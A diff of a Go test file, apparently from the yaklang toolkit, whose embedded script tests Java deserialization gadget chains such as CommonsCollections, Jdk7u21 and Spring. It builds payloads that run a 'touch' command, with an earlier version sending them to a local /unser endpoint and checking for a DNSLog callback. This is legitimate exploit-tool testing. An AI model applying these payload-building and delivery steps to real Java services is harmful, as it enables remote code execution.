@@ -7,21 +7,47 @@ import (
 )
 
 var ysoTestCode = `
-templateGadgetNames = ["CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections8"]
-for gadgetName in templateGadgetNames{
-	domain,token = risk.NewDNSLogDomain()~
-	gadgetIns = yso.GetGadget(gadgetName,yso.useDNSLogEvilClass(domain))~
-    payload,err = yso.ToBytes(gadgetIns)
-    rsp,req = poc.HTTP("GET /unser HTTP/1.1\nHost: 127.0.0.1:8081\n\n"+string(payload),poc.proxy("http://127.0.0.1:8084"))~
-    res = risk.CheckDNSLogByToken(token,3)~
-    if res.Len() == 0{
-        panic("test %s dnslog failed" % gadgetName)
-    }
-	log.info("gadget %s dnslog test success" % gadgetName)
+
+templateGadgetNames = ["CommonsCollectionsK1","CommonsCollectionsK2","Jdk7u21","CommonsCollections8","MozillaRhino2","JSON1","CommonsBeanutils1","Click1","Spring2","CommonsCollections10","CommonsBeanutils2","CommonsBeanutils1_183","JavassistWeld1","CommonsCollections11","Spring1","CommonsCollections3","Jdk8u20","CommonsCollections2","JBossInterceptors1","MozillaRhino1","ROME","CommonsBeanutils2_183","CommonsCollections4","Hibernate1","Vaadin1"]
+templateGadgetNames = ["Jdk7u21"]
+extArgsMap = {
+	"CommonsBeanutils2_183":"org.apache.commons.beanutils.BeanComparator:cb183",
+	"CommonsBeanutils1_183":"org.apache.commons.beanutils.BeanComparator:cb183",
+	"Jdk7u21":"Jdk7u21",
+	"Jdk8u20":"Jdk8u20",
+	"Spring2":"Spring2",
+	"Spring1":"Spring1",
+	"CommonsCollections3":"CommonsCollections3",
 }
+//templateGadgetNames = ["MozillaRhino1"]
+failedGadgets = []
+for gadgetName in templateGadgetNames{
+	try{
+		extArg = ""
+		if extArgsMap[gadgetName] != nil{
+			extArg = "=/tmp,"+extArgsMap[gadgetName]
+		}
+		randomstr = str.RandStr(8)
+		path = "/tmp/%s" % randomstr
+		gadgetIns = yso.GetGadget(gadgetName,yso.useRuntimeExecEvilClass("touch "+path))~
+		payload = yso.ToBytes(gadgetIns)~
+		payloadBase64 = codec.EncodeBase64(payload)~
+		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java -javaagent:/tmp/yak-yso-tester-loader.jar%s -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
+		exec.System(cmd)
+		if !file.IsExisted(path){
+			panic("not found file")
+		}
+		file.Remove(path)
+		log.info("gadget %s exec test success",gadgetName)
+	}catch e{
+		log.error("gadget %s exec test failed: %v", gadgetName,e)
+		failedGadgets.Append(gadgetName)
+	}
+}
+println("failed gadgets: %s" % str.Join(failedGadgets,","))
 `
 
-func TestName(t *testing.T) {
+func TestYsoBaseExternal(t *testing.T) {
 	err := yaklang.New().SafeEval(context.Background(), ysoTestCode)
 	if err != nil {
 		t.Fatal(err)
